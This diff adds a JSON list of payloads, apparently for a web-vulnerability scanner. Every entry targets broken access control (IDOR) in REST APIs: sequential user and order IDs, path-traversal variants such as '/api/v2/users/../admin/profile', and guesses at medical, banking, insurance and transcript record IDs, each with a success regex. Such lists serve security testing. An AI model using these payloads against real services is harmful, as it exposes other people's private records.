@@ -1,0 +1,937 @@
+[
+  {
+    "payload_id": "OWP-0767",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/users/101",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0768",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/orders/2001",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"order_id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0769",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/users/102",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0770",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/orders/2002",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"order_id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0771",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/users/103",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0772",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/orders/2003",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"order_id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0773",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/users/104",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0774",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/orders/2004",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"order_id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0775",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/users/105",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0776",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/orders/2005",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"order_id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0777",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/users/106",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0778",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/orders/2006",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"order_id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0779",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/users/107",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0780",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/orders/2007",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"order_id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0781",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/users/108",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0782",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/orders/2008",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"order_id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0783",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/users/109",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0784",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/orders/2009",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"order_id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0785",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/users/110",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0786",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/orders/2010",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"order_id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0787",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/users/111",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0788",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/orders/2011",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"order_id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0789",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/users/112",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0790",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/orders/2012",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"order_id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0791",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/users/113",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0792",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/orders/2013",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"order_id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0793",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/users/114",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0794",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/orders/2014",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"order_id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0795",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/users/115",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0796",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/orders/2015",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"order_id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0797",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/users/116",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0798",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/orders/2016",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"order_id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0799",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/users/117",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0800",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/orders/2017",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"order_id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0801",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/users/118",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0802",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/orders/2018",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"order_id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0803",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/users/119",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0804",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/orders/2019",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"order_id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0805",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/users/120",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0806",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/orders/2020",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"order_id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0807",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/users/121",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0808",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/orders/2021",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"order_id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0809",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/users/122",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0810",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/orders/2022",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"order_id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0811",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/users/123",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0812",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/orders/2023",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"order_id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0813",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/users/124",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0814",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/orders/2024",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"order_id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0815",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/users/125",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0816",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/orders/2025",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"order_id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0817",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/users/126",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0818",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/orders/2026",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"order_id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0819",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/users/127",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0820",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/orders/2027",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"order_id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0821",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/users/128",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0822",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/orders/2028",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"order_id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0823",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/users/129",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0824",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/orders/2029",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"order_id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0825",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/users/130",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0826",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/orders/2030",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"order_id\""
+    }
+  },
+  {
+    "payload_id": "OWP-0827",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/users/me/../target/101",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"email\"|\"role\""
+    }
+  },
+  {
+    "payload_id": "OWP-0828",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/v2/users/../admin/profile",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"email\"|\"role\""
+    }
+  },
+  {
+    "payload_id": "OWP-0829",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/documents?id=5000",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"email\"|\"role\""
+    }
+  },
+  {
+    "payload_id": "OWP-0830",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/users?userId=admin-101",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"email\"|\"role\""
+    }
+  },
+  {
+    "payload_id": "OWP-0831",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/account?account_number=100200300",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"email\"|\"role\""
+    }
+  },
+  {
+    "payload_id": "OWP-0832",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/patients/PAT-500",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"email\"|\"role\""
+    }
+  },
+  {
+    "payload_id": "OWP-0833",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/orders/batch?ids[]=1001",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"email\"|\"role\""
+    }
+  },
+  {
+    "payload_id": "OWP-0834",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/contracts/CON-2024-999",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"email\"|\"role\""
+    }
+  },
+  {
+    "payload_id": "OWP-0835",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/medical/chart/PAT-999",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"email\"|\"role\""
+    }
+  },
+  {
+    "payload_id": "OWP-0836",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/v1/transactions?accountId=1002",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"email\"|\"role\""
+    }
+  },
+  {
+    "payload_id": "OWP-0837",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/messages/unread?user_id=admin123",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"email\"|\"role\""
+    }
+  },
+  {
+    "payload_id": "OWP-0838",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/tickets?requester=user1&page=1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"email\"|\"role\""
+    }
+  },
+  {
+    "payload_id": "OWP-0839",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/documents/../users/101/profile",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"email\"|\"role\""
+    }
+  },
+  {
+    "payload_id": "OWP-0840",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/search?q=*&type=user",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"email\"|\"role\""
+    }
+  },
+  {
+    "payload_id": "OWP-0841",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/notes/shared?noteId=5001",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"email\"|\"role\""
+    }
+  },
+  {
+    "payload_id": "OWP-0842",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/v3/employees/batch?ids=1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"email\"|\"role\""
+    }
+  },
+  {
+    "payload_id": "OWP-0843",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "2",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"email\"|\"role\""
+    }
+  },
+  {
+    "payload_id": "OWP-0844",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "3",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"email\"|\"role\""
+    }
+  },
+  {
+    "payload_id": "OWP-0845",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "4",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"email\"|\"role\""
+    }
+  },
+  {
+    "payload_id": "OWP-0846",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/medical-records/MR-5001",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"email\"|\"role\""
+    }
+  },
+  {
+    "payload_id": "OWP-0847",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/beneficiaries/BEN-800",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"email\"|\"role\""
+    }
+  },
+  {
+    "payload_id": "OWP-0848",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/policies/POL-2024-5001",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"email\"|\"role\""
+    }
+  },
+  {
+    "payload_id": "OWP-0849",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/claims/CLM-30001",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"email\"|\"role\""
+    }
+  },
+  {
+    "payload_id": "OWP-0850",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/edu/transcripts/STU-1001",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"email\"|\"role\""
+    }
+  },
+  {
+    "payload_id": "OWP-0851",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "REST API",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/banking/statements/ACC-5000",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "\"email\"|\"role\""
+    }
+  }
+]
